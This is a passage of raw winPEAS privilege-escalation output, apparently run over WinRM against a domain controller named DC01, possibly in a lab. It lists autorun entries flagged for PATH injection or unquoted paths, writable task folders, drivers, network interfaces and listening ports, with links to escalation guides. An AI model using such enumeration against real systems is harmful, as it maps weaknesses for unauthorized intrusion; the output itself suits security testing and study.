WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: wow64base
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: wow64base.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: wow64con
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: wow64con.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: wow64win
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: wow64win.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: WS2_32
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: WS2_32.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{2C7339CF-2B09-4501-B3F3-F3508C9228ED}
WINRM       172.16.55.128   5985   DC01                 Key: StubPath
WINRM       172.16.55.128   5985   DC01                 Folder: \
WINRM       172.16.55.128   5985   DC01                 FolderPerms: Users [Allow: AppendData/CreateDirectories]                                                                                                
WINRM       172.16.55.128   5985   DC01                 File: /UserInstall
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}                                               
WINRM       172.16.55.128   5985   DC01                 Key: StubPath
WINRM       172.16.55.128   5985   DC01                 Folder: C:\Windows\system32
WINRM       172.16.55.128   5985   DC01                 File: C:\Windows\system32\unregmp2.exe /FirstLogon
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4340}                                               
WINRM       172.16.55.128   5985   DC01                 Key: StubPath
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: U
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4383}                                               
WINRM       172.16.55.128   5985   DC01                 Key: StubPath
WINRM       172.16.55.128   5985   DC01                 Folder: C:\Windows\System32
WINRM       172.16.55.128   5985   DC01                 File: C:\Windows\System32\ie4uinit.exe -UserConfig
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}                                               
WINRM       172.16.55.128   5985   DC01                 Key: StubPath
WINRM       172.16.55.128   5985   DC01                 Folder: C:\Windows\System32
WINRM       172.16.55.128   5985   DC01                 File: C:\Windows\System32\Rundll32.exe C:\Windows\System32\mscories.dll,Install                                                                         
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{9459C573-B17A-45AE-9F64-1857B5D58CEE}                                               
WINRM       172.16.55.128   5985   DC01                 Key: StubPath
WINRM       172.16.55.128   5985   DC01                 Folder: C:\Program Files (x86)\Microsoft\Edge\Application\146.0.3856.109\Installer                                                                      
WINRM       172.16.55.128   5985   DC01                 File: C:\Program Files (x86)\Microsoft\Edge\Application\146.0.3856.109\Installer\setup.exe --configure-user-settings --verbose-logging --system-level --msedge --channel=stable (Unquoted and Space detected) - C:\
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{A509B1A7-37EF-4b3f-8CFC-4F3A74704073}                                               
WINRM       172.16.55.128   5985   DC01                 Key: StubPath
WINRM       172.16.55.128   5985   DC01                 Folder: C:\Windows\System32
WINRM       172.16.55.128   5985   DC01                 File: C:\Windows\System32\rundll32.exe C:\Windows\System32\iesetup.dll,IEHardenAdmin                                                                    
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{A509B1A8-37EF-4b3f-8CFC-4F3A74704073}                                               
WINRM       172.16.55.128   5985   DC01                 Key: StubPath
WINRM       172.16.55.128   5985   DC01                 Folder: C:\Windows\System32
WINRM       172.16.55.128   5985   DC01                 File: C:\Windows\System32\rundll32.exe C:\Windows\System32\iesetup.dll,IEHardenUser                                                                     
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}                                   
WINRM       172.16.55.128   5985   DC01                 Key: StubPath
WINRM       172.16.55.128   5985   DC01                 Folder: C:\Windows\system32
WINRM       172.16.55.128   5985   DC01                 File: C:\Windows\system32\unregmp2.exe /FirstLogon
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}                                   
WINRM       172.16.55.128   5985   DC01                 Key: StubPath
WINRM       172.16.55.128   5985   DC01                 Folder: C:\Windows\SysWOW64
WINRM       172.16.55.128   5985   DC01                 File: C:\Windows\SysWOW64\Rundll32.exe C:\Windows\SysWOW64\mscories.dll,Install                                                                         
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{1FD49718-1D00-4B19-AF5F-070AF6D5D54C}                          
WINRM       172.16.55.128   5985   DC01                 Folder: C:\Program Files (x86)\Microsoft\Edge\Application\146.0.3856.109\BHO                                                                            
WINRM       172.16.55.128   5985   DC01                 File: C:\Program Files (x86)\Microsoft\Edge\Application\146.0.3856.109\BHO\ie_to_edge_bho_64.dll (Unquoted and Space detected) - C:\                    
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{1FD49718-1D00-4B19-AF5F-070AF6D5D54C}              
WINRM       172.16.55.128   5985   DC01                 Folder: C:\Program Files (x86)\Microsoft\Edge\Application\146.0.3856.109\BHO                                                                            
WINRM       172.16.55.128   5985   DC01                 File: C:\Program Files (x86)\Microsoft\Edge\Application\146.0.3856.109\BHO\ie_to_edge_bho_64.dll (Unquoted and Space detected) - C:\                    
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup                                                                                    
WINRM       172.16.55.128   5985   DC01                 File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini                                                                          
WINRM       172.16.55.128   5985   DC01                 Potentially sensitive file content: LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21787
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 Folder: C:\windows\tasks
WINRM       172.16.55.128   5985   DC01                 FolderPerms: Authenticated Users [Allow: WriteData/CreateFiles]                                                                                         
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 Folder: C:\windows\system32\tasks
WINRM       172.16.55.128   5985   DC01                 FolderPerms: Authenticated Users [Allow: WriteData/CreateFiles]                                                                                         
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 Folder: C:\windows
WINRM       172.16.55.128   5985   DC01                 File: C:\windows\system.ini
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 Folder: C:\windows
WINRM       172.16.55.128   5985   DC01                 File: C:\windows\win.ini
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Scheduled Applications --Non Microsoft--                                                                                                       
WINRM       172.16.55.128   5985   DC01             È Check if you can modify other users scheduled binaries https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html                                                                       
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Device Drivers --Non Microsoft--
WINRM       172.16.55.128   5985   DC01             È Check 3rd party drivers for known vulnerabilities/rootkits. https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#drivers                                                                                               
WINRM       172.16.55.128   5985   DC01                 VMware vSockets Service - 9.8.19.0 build-18956547 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vsock.sys                                  
WINRM       172.16.55.128   5985   DC01                 VMware Raw Disk Helper Driver - 1.1.7.0 build-18933738 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vmrawdsk.sys                          
WINRM       172.16.55.128   5985   DC01                 VMware Pointing PS/2 Device Driver - 12.5.12.0 build-18967789 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmmouse.sys                    
WINRM       172.16.55.128   5985   DC01                 Intel(R) PRO/1000 Adapter - 8.4.13.0 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\E1G6032E.sys                                       
WINRM       172.16.55.128   5985   DC01                 VMware server memory controller - 7.5.7.0 build-18933738 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vmmemctl.sys                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Network Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ                                                             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Network Shares
WINRM       172.16.55.128   5985   DC01               [X] Exception: Access denied 
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerate Network Mapped Drives (WMI)
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Host File
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Network Ifaces and known hosts
WINRM       172.16.55.128   5985   DC01             È The masks are only for the IPv4 addresses 
WINRM       172.16.55.128   5985   DC01                 Ethernet[08:00:27:2F:A0:3B]: 172.16.55.128, fe80::c833:192d:dba0:737%4 / 255.255.252.0                                                                  
WINRM       172.16.55.128   5985   DC01                     Gateways: 172.16.52.1
WINRM       172.16.55.128   5985   DC01                     DNSs: 114.114.114.114, 114.114.115.115
WINRM       172.16.55.128   5985   DC01                     Known hosts:
WINRM       172.16.55.128   5985   DC01                       10.0.2.2              00-00-00-00-00-00     Invalid                                                                                               
WINRM       172.16.55.128   5985   DC01                       169.254.169.254       00-00-00-00-00-00     Invalid                                                                                               
WINRM       172.16.55.128   5985   DC01                       172.16.52.1           00-74-9C-E6-DF-52     Dynamic                                                                                               
WINRM       172.16.55.128   5985   DC01                       172.16.55.128          00-00-00-00-00-00     Invalid                                                                                               
WINRM       172.16.55.128   5985   DC01                       172.16.55.193         00-0C-29-3D-0E-6F     Dynamic                                                                                               
WINRM       172.16.55.128   5985   DC01                       172.16.55.255         FF-FF-FF-FF-FF-FF     Static                                                                                                
WINRM       172.16.55.128   5985   DC01                       224.0.0.22            01-00-5E-00-00-16     Static                                                                                                
WINRM       172.16.55.128   5985   DC01                       224.0.0.251           01-00-5E-00-00-FB     Static                                                                                                
WINRM       172.16.55.128   5985   DC01                       224.0.0.252           01-00-5E-00-00-FC     Static                                                                                                
WINRM       172.16.55.128   5985   DC01                       255.255.255.255       FF-FF-FF-FF-FF-FF     Static                                                                                                
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0                                                                                               
WINRM       172.16.55.128   5985   DC01                     DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
WINRM       172.16.55.128   5985   DC01                     Known hosts:
WINRM       172.16.55.128   5985   DC01                       224.0.0.22            00-00-00-00-00-00     Static                                                                                                
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Current TCP Listening Ports
WINRM       172.16.55.128   5985   DC01             È Check for services restricted from the outside 
WINRM       172.16.55.128   5985   DC01               Enumerating IPv4 connections
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name                       
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               TCP        0.0.0.0               88            0.0.0.0               0               Listening         652             lsass                              
WINRM       172.16.55.128   5985   DC01               TCP        0.0.0.0               135           0.0.0.0               0               Listening         932             svchost                            
WINRM       172.16.55.128   5985   DC01               TCP        0.0.0.0               389           0.0.0.0               0               Listening         652             lsass                              
WINRM       172.16.55.128   5985   DC01               TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System                             
WINRM       172.16.55.128   5985   DC01               TCP        0.0.0.0               464           0.0.0.0               0               Listening         652             lsass                              
WINRM       172.16.55.128   5985   DC01               TCP        0.0.0.0               593           0.0.0.0               0               Listening         932             svchost                            
WINRM       172.16.55.128   5985   DC01               TCP        0.0.0.0               636           0.0.0.0               0               Listening         652             lsass                              
WINRM       172.16.55.128   5985   DC01               TCP        0.0.0.0               1433          0.0.0.0               0               Listening         4476            sqlservr                           
WINRM       172.16.55.128   5985   DC01               TCP        0.0.0.0               3268          0.0.0.0               0               Listening         652             lsass                              
WINRM       172.16.55.128   5985   DC01               TCP        0.0.0.0               3269          0.0.0.0               0               Listening         652             lsass                              
WINRM       172.16.55.128   5985   DC01               TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System                             
WINRM       172.16.55.128   5985   DC01               TCP        0.0.0.0               9389          0.0.0.0               0               Listening         2916            Microsoft.ActiveDirectory.WebServices                                                                                                      
WINRM       172.16.55.128   5985   DC01               TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System                             
WINRM       172.16.55.128   5985   DC01               TCP        0.0.0.0               49664         0.0.0.0               0               Listening         652             lsass                              
WINRM       172.16.55.128   5985   DC01               TCP        0.0.0.0               49665         0.0.0.0               0               Listening         496             wininit                            
WINRM       172.16.55.128   5985   DC01               TCP        0.0.0.0               49666         0.0.0.0               0               Listening         1224            svchost                            
WINRM       172.16.55.128   5985   DC01               TCP        0.0.0.0               49667         0.0.0.0               0               Listening         1704            svchost                            
WINRM       172.16.55.128   5985   DC01               TCP        0.0.0.0               49668         0.0.0.0               0               Listening         652             lsass                              
WINRM       172.16.55.128   5985   DC01               TCP        0.0.0.0               49677         0.0.0.0               0               Listening         652             lsass                              
WINRM       172.16.55.128   5985   DC01               TCP        0.0.0.0               49678         0.0.0.0               0               Listening         2784            spoolsv                            
WINRM       172.16.55.128   5985   DC01               TCP        0.0.0.0               49681         0.0.0.0               0               Listening         640             services                           
WINRM       172.16.55.128   5985   DC01               TCP        0.0.0.0               49691         0.0.0.0               0               Listening         2880            certsrv                            
WINRM       172.16.55.128   5985   DC01               TCP        0.0.0.0               49705         0.0.0.0               0               Listening         2936            dns                                
WINRM       172.16.55.128   5985   DC01               TCP        0.0.0.0               49761         0.0.0.0               0               Listening         2896            dfsrs                              
WINRM       172.16.55.128   5985   DC01               TCP        127.0.0.1             53            0.0.0.0               0               Listening         2936            dns
WINRM       172.16.55.128   5985   DC01               TCP        127.0.0.1             1434          0.0.0.0               0               Listening         4476            sqlservr
WINRM       172.16.55.128   5985   DC01               TCP        172.16.55.128         53            0.0.0.0               0               Listening         2936            dns                                
WINRM       172.16.55.128   5985   DC01               TCP        172.16.55.128         139           0.0.0.0               0               Listening         4               System                             
WINRM       172.16.55.128   5985   DC01               TCP        172.16.55.128         445           172.16.55.193         54476           Established       4               System                             
WINRM       172.16.55.128   5985   DC01               TCP        172.16.55.128         445           172.16.55.193         55438           Established       4               System                             
WINRM       172.16.55.128   5985   DC01               TCP        172.16.55.128         1433          172.16.55.193         35720           Established       4476            sqlservr                           
WINRM       172.16.55.128   5985   DC01               TCP        172.16.55.128         1433          172.16.55.193         38112           Established       4476            sqlservr                           
WINRM       172.16.55.128   5985   DC01               TCP        172.16.55.128         1433          172.16.55.193         39144           Established       4476            sqlservr                           
WINRM       172.16.55.128   5985   DC01               TCP        172.16.55.128         1433          172.16.55.193         49774           Established       4476            sqlservr                           
WINRM       172.16.55.128   5985   DC01               TCP        172.16.55.128         1433          172.16.55.193         55852           Established       4476            sqlservr                           
WINRM       172.16.55.128   5985   DC01               TCP        172.16.55.128         1433          172.16.55.193         56146           Established       4476            sqlservr                           
WINRM       172.16.55.128   5985   DC01               TCP        172.16.55.128         1433          172.16.55.193         56550           Established       4476            sqlservr                           
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               Enumerating IPv6 connections
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               Protocol   Local Address                               Local Port    Remote Address                              Remote Port     State             Process ID      Process Name                                                                                   
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               TCP        [::]                                        88            [::]                                        0               Listening         652             lsass
WINRM       172.16.55.128   5985   DC01               TCP        [::]                                        135           [::]                                        0               Listening         932             svchost
WINRM       172.16.55.128   5985   DC01               TCP        [::]                                        389           [::]                                        0               Listening         652             lsass
WINRM       172.16.55.128   5985   DC01               TCP        [::]                                        445           [::]                                        0               Listening         4               System
WINRM       172.16.55.128   5985   DC01               TCP        [::]                                        464           [::]                                        0               Listening         652             lsass
WINRM       172.16.55.128   5985   DC01               TCP        [::]                                        593           [::]                                        0               Listening         932             svchost
WINRM       172.16.55.128   5985   DC01               TCP        [::]                                        636           [::]                                        0               Listening         652             lsass
WINRM       172.16.55.128   5985   DC01               TCP        [::]                                        1433          [::]                                        0               Listening         4476            sqlservr
WINRM       172.16.55.128   5985   DC01               TCP        [::]                                        3268          [::]                                        0               Listening         652             lsass
WINRM       172.16.55.128   5985   DC01               TCP        [::]                                        3269          [::]                                        0               Listening         652             lsass
WINRM       172.16.55.128   5985   DC01               TCP        [::]                                        5985          [::]                                        0               Listening         4               System
WINRM       172.16.55.128   5985   DC01               TCP        [::]                                        9389          [::]                                        0               Listening         2916            Microsoft.ActiveDirectory.WebServices
WINRM       172.16.55.128   5985   DC01               TCP        [::]                                        47001         [::]                                        0               Listening         4               System
WINRM       172.16.55.128   5985   DC01               TCP        [::]                                        49664         [::]                                        0               Listening         652             lsass
WINRM       172.16.55.128   5985   DC01               TCP        [::]                                        49665         [::]                                        0               Listening         496             wininit
WINRM       172.16.55.128   5985   DC01               TCP        [::]                                        49666         [::]                                        0               Listening         1224            svchost
WINRM       172.16.55.128   5985   DC01               TCP        [::]                                        49667         [::]                                        0               Listening         1704            svchost
WINRM       172.16.55.128   5985   DC01               TCP        [::]                                        49668         [::]                                        0               Listening         652             lsass
WINRM       172.16.55.128   5985   DC01               TCP        [::]                                        49677         [::]                                        0               Listening         652             lsass
WINRM       172.16.55.128   5985   DC01               TCP        [::]                                        49678         [::]                                        0               Listening         2784            spoolsv
WINRM       172.16.55.128   5985   DC01               TCP        [::]                                        49681         [::]                                        0               Listening         640             services
WINRM       172.16.55.128   5985   DC01               TCP        [::]                                        49691         [::]                                        0               Listening         2880            certsrv
WINRM       172.16.55.128   5985   DC01               TCP        [::]                                        49705         [::]                                        0               Listening         2936            dns
WINRM       172.16.55.128   5985   DC01               TCP        [::]                                        49761         [::]                                        0               Listening         2896            dfsrs
WINRM       172.16.55.128   5985   DC01               TCP        [::1]                                       53            [::]                                        0               Listening         2936            dns
WINRM       172.16.55.128   5985   DC01               TCP        [::1]                                       389           [::1]                                       49679           Established       652             lsass
WINRM       172.16.55.128   5985   DC01               TCP        [::1]                                       389           [::1]                                       49680           Established       652             lsass
WINRM       172.16.55.128   5985   DC01               TCP        [::1]                                       389           [::1]                                       49703           Established       652             lsass
WINRM       172.16.55.128   5985   DC01               TCP        [::1]                                       1434          [::]                                        0               Listening         4476            sqlservr
WINRM       172.16.55.128   5985   DC01               TCP        [::1]                                       49679         [::1]                                       389             Established       2908            ismserv
WINRM       172.16.55.128   5985   DC01               TCP        [::1]                                       49680         [::1]                                       389             Established       2908            ismserv
WINRM       172.16.55.128   5985   DC01               TCP        [::1]                                       49703         [::1]                                       389             Established       2936            dns
WINRM       172.16.55.128   5985   DC01               TCP        [fe80::c833:192d:dba0:737%4]                53            [::]                                        0               Listening         2936            dns
WINRM       172.16.55.128   5985   DC01               TCP        [fe80::c833:192d:dba0:737%4]                135           [fe80::c833:192d:dba0:737%4]                50841           Established       932             svchost                                                                                        
WINRM       172.16.55.128   5985   DC01               TCP        [fe80::c833:192d:dba0:737%4]                389           [fe80::c833:192d:dba0:737%4]                49715           Established       652             lsass                                                                                          
WINRM       172.16.55.128   5985   DC01               TCP        [fe80::c833:192d:dba0:737%4]                389           [fe80::c833:192d:dba0:737%4]                49756           Established       652             lsass                                                                                          
WINRM       172.16.55.128   5985   DC01               TCP        [fe80::c833:192d:dba0:737%4]                389           [fe80::c833:192d:dba0:737%4]                49759           Established       652             lsass                                                                                          
WINRM       172.16.55.128   5985   DC01               TCP        [fe80::c833:192d:dba0:737%4]                49668         [fe80::c833:192d:dba0:737%4]                49758           Established       652             lsass                                                                                          
WINRM       172.16.55.128   5985   DC01               TCP        [fe80::c833:192d:dba0:737%4]                49668         [fe80::c833:192d:dba0:737%4]                49892           Established       652             lsass                                                                                          
WINRM       172.16.55.128   5985   DC01               TCP        [fe80::c833:192d:dba0:737%4]                49668         [fe80::c833:192d:dba0:737%4]                50842           Established       652             lsass                                                                                          
WINRM       172.16.55.128   5985   DC01               TCP        [fe80::c833:192d:dba0:737%4]                49715         [fe80::c833:192d:dba0:737%4]                389             Established       2936            dns                                                                                            
WINRM       172.16.55.128   5985   DC01               TCP        [fe80::c833:192d:dba0:737%4]                49756         [fe80::c833:192d:dba0:737%4]                389             Established       2896            dfsrs                                                                                          
WINRM       172.16.55.128   5985   DC01               TCP        [fe80::c833:192d:dba0:737%4]                49758         [fe80::c833:192d:dba0:737%4]                49668           Established       2896            dfsrs                                                                                          
WINRM       172.16.55.128   5985   DC01               TCP        [fe80::c833:192d:dba0:737%4]                49759         [fe80::c833:192d:dba0:737%4]                389             Established       2896            dfsrs                                                                                          
WINRM       172.16.55.128   5985   DC01               TCP        [fe80::c833:192d:dba0:737%4]                49892         [fe80::c833:192d:dba0:737%4]                49668           Established       652             lsass                                                                                          
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Current UDP Listening Ports
WINRM       172.16.55.128   5985   DC01             È Check for services restricted from the outside 
WINRM       172.16.55.128   5985   DC01               Enumerating IPv4 connections
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               Protocol   Local Address         Local Port    Remote Address:Remote Port     Process ID        Process Name                                              
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               UDP        0.0.0.0               123           *:*                            88                svchost                                                   
WINRM       172.16.55.128   5985   DC01               UDP        0.0.0.0               389           *:*                            652               lsass                                                     
WINRM       172.16.55.128   5985   DC01               UDP        0.0.0.0               500           *:*                            2924              svchost                                                   
WINRM       172.16.55.128   5985   DC01               UDP        0.0.0.0               4500          *:*                            2924              svchost                                                   
WINRM       172.16.55.128   5985   DC01               UDP        0.0.0.0               5353          *:*                            1216              svchost                                                   
WINRM       172.16.55.128   5985   DC01               UDP        0.0.0.0               5355          *:*                            1216              svchost                                                   
WINRM       172.16.55.128   5985   DC01               UDP        0.0.0.0               54227         *:*                            1216              svchost                                                   
WINRM       172.16.55.128   5985   DC01               UDP        127.0.0.1             49222         *:*                            2908              ismserv
WINRM       172.16.55.128   5985   DC01               UDP        127.0.0.1             54226         *:*                            2916              Microsoft.ActiveDirectory.WebServices
WINRM       172.16.55.128   5985   DC01               UDP        127.0.0.1             54228         *:*                            2896              dfsrs
WINRM       172.16.55.128   5985   DC01               UDP        127.0.0.1             54231         *:*                            652               lsass
WINRM       172.16.55.128   5985   DC01               UDP        127.0.0.1             54232         *:*                            1440              svchost
WINRM       172.16.55.128   5985   DC01               UDP        127.0.0.1             59991         *:*                            1508              svchost
WINRM       172.16.55.128   5985   DC01               UDP        127.0.0.1             60979         *:*                            2124              svchost
WINRM       172.16.55.128   5985   DC01               UDP        127.0.0.1             63257         *:*                            2880              certsrv
WINRM       172.16.55.128   5985   DC01               UDP        127.0.0.1             64258         *:*                            3112              dfssvc
WINRM       172.16.55.128   5985   DC01               UDP        127.0.0.1             64542         *:*                            4176              C:\ProgramData\winPEASx64.exe
WINRM       172.16.55.128   5985   DC01               UDP        172.16.55.128         88            *:*                            652               lsass                                                     
WINRM       172.16.55.128   5985   DC01               UDP        172.16.55.128         137           *:*                            4                 System                                                    
WINRM       172.16.55.128   5985   DC01               UDP        172.16.55.128         138           *:*                            4                 System                                                    
WINRM       172.16.55.128   5985   DC01               UDP        172.16.55.128         464           *:*                            652               lsass                                                     
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               Enumerating IPv6 connections
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               Protocol   Local Address                               Local Port    Remote Address:Remote Port     Process ID        Process Name                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               UDP        [::]                                        123           *:*                            88                svchost
WINRM       172.16.55.128   5985   DC01               UDP        [::]                                        389           *:*                            652               lsass
WINRM       172.16.55.128   5985   DC01               UDP        [::]                                        500           *:*                            2924              svchost
WINRM       172.16.55.128   5985   DC01               UDP        [::]                                        4500          *:*                            2924              svchost
WINRM       172.16.55.128   5985   DC01               UDP        [::]                                        5353          *:*                            1216              svchost
WINRM       172.16.55.128   5985   DC01               UDP        [::]                                        5355          *:*                            1216              svchost
WINRM       172.16.55.128   5985   DC01               UDP        [::]                                        54227         *:*                            1216              svchost
WINRM       172.16.55.128   5985   DC01               UDP        [fe80::c833:192d:dba0:737%4]                88            *:*                            652               lsass                               
